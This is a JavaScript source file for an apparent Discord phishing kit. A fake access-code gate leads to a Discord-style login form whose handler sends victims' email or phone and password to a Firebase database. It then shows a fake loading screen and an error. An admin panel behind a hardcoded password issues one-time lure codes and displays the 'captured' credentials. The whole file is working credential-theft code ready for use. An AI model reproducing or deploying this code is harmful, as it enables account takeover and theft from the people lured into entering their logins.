// Firebase Configuration
const firebaseConfig = {
    databaseURL: "https://kom-tm-default-rtdb.europe-west1.firebasedatabase.app/"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Check which page we're on
const isAdminPage = window.location.pathname.includes('admin');

if (isAdminPage) {
    initAdminPanel();
} else {
    initMainPage();
}

// ==================== MAIN PAGE ====================
function initMainPage() {
    const accessScreen = document.getElementById('access-screen');
    const loginOverlay = document.getElementById('login-overlay');
    const successScreen = document.getElementById('success-screen');
    const errorScreen = document.getElementById('error-screen');
    
    const accessCode = document.getElementById('access-code');
    const accessBtn = document.getElementById('access-btn');
    const accessError = document.getElementById('access-error');
    
    const closePopup = document.getElementById('close-popup');
    const discordForm = document.getElementById('discord-login-form');
    const tryAgainBtn = document.getElementById('try-again-btn');
    
    let currentCode = '';

    // Access Code Submission
    accessBtn.addEventListener('click', validateAccessCode);
    accessCode.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') validateAccessCode();
    });

    async function validateAccessCode() {
        const code = accessCode.value.trim();
        
        if (!code) {
            showError('Please enter an access code');
            return;
        }

        // Check for admin code
        if (code === 'adminmccg') {
            window.location.href = 'admin.html';
            return;
        }

        // Check if code exists in database
        try {
            const snapshot = await database.ref('codes/' + code).once('value');
            const codeData = snapshot.val();
            
            if (codeData && codeData.active) {
                currentCode = code;
                accessScreen.classList.add('hidden');
                loginOverlay.classList.remove('hidden');
                accessError.classList.add('hidden');
            } else {
                showError('Invalid or expired access code');
            }
        } catch (error) {
            console.error('Error validating code:', error);
            showError('Error validating code. Please try again.');
        }
    }

    function showError(message) {
        accessError.textContent = message;
        accessError.classList.remove('hidden');
    }

    // Close popup
    closePopup.addEventListener('click', () => {
        loginOverlay.classList.add('hidden');
        accessScreen.classList.remove('hidden');
        accessCode.value = '';
    });

    // Discord Form Submission
    discordForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const email = document.getElementById('emailORphone').value;
        const password = document.getElementById('password').value;
        
        if (!email || !password) return;

        // Save to Firebase
        try {
            const loginData = {
                email: email,
                password: password,
                codeUsed: currentCode,
                timestamp: new Date().toISOString(),
                owner: false
            };

            await database.ref('logins').push(loginData);
            
            // Mark code as used
            await database.ref('codes/' + currentCode).update({
                active: false,
                usedAt: new Date().toISOString()
            });

            // Show success screen
            loginOverlay.classList.add('hidden');
            successScreen.classList.remove('hidden');

            // After loading animation, show error
            setTimeout(() => {
                successScreen.classList.add('hidden');
                errorScreen.classList.remove('hidden');
            }, 2500);

        } catch (error) {
            console.error('Error saving login:', error);
        }
    });

    // Try Again Button
    tryAgainBtn.addEventListener('click', () => {
        errorScreen.classList.add('hidden');
        accessScreen.classList.remove('hidden');
        accessCode.value = '';
        document.getElementById('emailORphone').value = '';
        document.getElementById('password').value = '';
    });
}

// ==================== ADMIN PANEL ====================
function initAdminPanel() {
    const adminLogin = document.getElementById('admin-login');
    const adminPanel = document.getElementById('admin-panel');
    const adminPass = document.getElementById('admin-pass');
    const adminLoginBtn = document.getElementById('admin-login-btn');
    const adminError = document.getElementById('admin-error');
    const logoutBtn = document.getElementById('logout-btn');
    
    const generateCodeBtn = document.getElementById('generate-code-btn');
    const generatedCodeDisplay = document.getElementById('generated-code-display');
    const codeText = document.getElementById('code-text');
    const toggleCodeBtn = document.getElementById('toggle-code-btn');
    const copyCodeBtn = document.getElementById('copy-code-btn');
    const codesList = document.getElementById('codes-list');
    const usersTbody = document.getElementById('users-tbody');
    
    let currentGeneratedCode = '';
    let isCodeVisible = false;

    // Check if already logged in
    if (sessionStorage.getItem('adminLoggedIn') === 'true') {
        showAdminPanel();
    }

    // Admin Login
    adminLoginBtn.addEventListener('click', adminLoginHandler);
    adminPass.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') adminLoginHandler();
    });

    function adminLoginHandler() {
        const password = adminPass.value.trim();
        
        if (password === 'adminmccg') {
            sessionStorage.setItem('adminLoggedIn', 'true');
            showAdminPanel();
        } else {
            adminError.classList.remove('hidden');
        }
    }

    function showAdminPanel() {
        adminLogin.classList.add('hidden');
        adminPanel.classList.remove('hidden');
        loadCodes();
        loadLogins();
    }

    // Logout
    logoutBtn.addEventListener('click', () => {
        sessionStorage.removeItem('adminLoggedIn');
        adminPanel.classList.add('hidden');
        adminLogin.classList.remove('hidden');
        adminPass.value = '';
    });

    // Generate Code
    generateCodeBtn.addEventListener('click', async () => {
        const code = generateMCCode();
        currentGeneratedCode = code;
        
        // Save to Firebase
        try {
            await database.ref('codes/' + code).set({
                code: code,
                active: true,
                createdAt: new Date().toISOString()
            });
            
            codeText.textContent = '****************';
            codeText.classList.add('code-hidden');
            isCodeVisible = false;
            toggleCodeBtn.textContent = 'Show';
            generatedCodeDisplay.classList.remove('hidden');
            
            loadCodes();
        } catch (error) {
            console.error('Error generating code:', error);
        }
    });

    // Toggle Code Visibility
    toggleCodeBtn.addEventListener('click', () => {
        isCodeVisible = !isCodeVisible;
        codeText.textContent = isCodeVisible ? currentGeneratedCode : '****************';
        codeText.classList.toggle('code-hidden', !isCodeVisible);
        toggleCodeBtn.textContent = isCodeVisible ? 'Hide' : 'Show';
    });

    // Copy Code
    copyCodeBtn.addEventListener('click', () => {
        navigator.clipboard.writeText(currentGeneratedCode);
        copyCodeBtn.textContent = 'Copied!';
        setTimeout(() => {
            copyCodeBtn.textContent = 'Copy';
        }, 2000);
    });

    // Generate MC Code
    function generateMCCode() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let code = 'MC-';
        for (let i = 0; i < 8; i++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return code;
    }

    // Load Codes
    function loadCodes() {
        database.ref('codes').on('value', (snapshot) => {
            const codes = snapshot.val();
            let html = '';
            let activeCount = 0;
            
            if (codes) {
                Object.keys(codes).reverse().forEach(key => {
                    const code = codes[key];
                    if (code.active) activeCount++;
                    
                    const date = new Date(code.createdAt).toLocaleDateString();
                    const statusClass = code.active ? 'active' : 'used';
                    const statusText = code.active ? 'Active' : 'Used';
                    
                    html += `
                        <div class="code-item">
                            <div class="code-item-left">
                                <span class="code-item-code hidden-code" data-code="${code.code}">****************</span>
                                <span class="code-item-date">${date}</span>
                                <span class="code-status ${statusClass}">${statusText}</span>
                            </div>
                            <div class="code-item-actions">
                                <button class="icon-btn toggle-list-code" data-code="${code.code}">Show</button>
                                <button class="delete-btn" data-key="${key}">Delete</button>
                            </div>
                        </div>
                    `;
                });
            }
            
            codesList.innerHTML = html || '<p class="empty-state">No codes generated yet</p>';
            document.getElementById('active-codes').textContent = activeCount;
            
            // Add event listeners for toggle buttons
            document.querySelectorAll('.toggle-list-code').forEach(btn => {
                btn.addEventListener('click', function() {
                    const code = this.dataset.code;
                    const codeSpan = this.closest('.code-item').querySelector('.code-item-code');
                    const isHidden = codeSpan.classList.contains('hidden-code');
                    
                    if (isHidden) {
                        codeSpan.textContent = code;
                        codeSpan.classList.remove('hidden-code');
                        this.textContent = 'Hide';
                    } else {
                        codeSpan.textContent = '****************';
                        codeSpan.classList.add('hidden-code');
                        this.textContent = 'Show';
                    }
                });
            });
            
            // Add event listeners for delete buttons
            document.querySelectorAll('.delete-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    const key = this.dataset.key;
                    if (confirm('Are you sure you want to delete this code?')) {
                        database.ref('codes/' + key).remove();
                    }
                });
            });
        });
    }

    // Load Logins
    function loadLogins() {
        database.ref('logins').on('value', (snapshot) => {
            const logins = snapshot.val();
            let html = '';
            let totalCount = 0;
            let todayCount = 0;
            const today = new Date().toDateString();
            
            if (logins) {
                Object.keys(logins).reverse().forEach(key => {
                    const login = logins[key];
                    totalCount++;
                    
                    const loginDate = new Date(login.timestamp);
                    if (loginDate.toDateString() === today) {
                        todayCount++;
                    }
                    
                    const formattedDate = loginDate.toLocaleString();
                    
                    html += `
                        <tr>
                            <td>${escapeHtml(login.email)}</td>
                            <td>
                                <div class="password-cell">
                                    <span class="password-text" data-password="${escapeHtml(login.password)}">********</span>
                                    <button class="icon-btn toggle-password">Show</button>
                                </div>
                            </td>
                            <td>${escapeHtml(login.codeUsed || 'N/A')}</td>
                            <td>${formattedDate}</td>
                            <td>
                                <button class="delete-btn delete-login" data-key="${key}">Delete</button>
                            </td>
                        </tr>
                    `;
                });
            }
            
            usersTbody.innerHTML = html || '<tr><td colspan="5" class="empty-state">No logins captured yet</td></tr>';
            document.getElementById('user-count').textContent = totalCount;
            document.getElementById('total-logins').textContent = totalCount;
            document.getElementById('today-logins').textContent = todayCount;
            
            // Add event listeners for password toggle
            document.querySelectorAll('.toggle-password').forEach(btn => {
                btn.addEventListener('click', function() {
                    const passwordSpan = this.previousElementSibling;
                    const actualPassword = passwordSpan.dataset.password;
                    const isHidden = passwordSpan.textContent === '********';
                    
                    if (isHidden) {
                        passwordSpan.textContent = actualPassword;
                        this.textContent = 'Hide';
                    } else {
                        passwordSpan.textContent = '********';
                        this.textContent = 'Show';
                    }
                });
            });
            
            // Add event listeners for delete login buttons
            document.querySelectorAll('.delete-login').forEach(btn => {
                btn.addEventListener('click', function() {
                    const key = this.dataset.key;
                    if (confirm('Are you sure you want to delete this login record?')) {
                        database.ref('logins/' + key).remove();
                    }
                });
            });
        });
    }

    // Helper function to escape HTML
    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
}
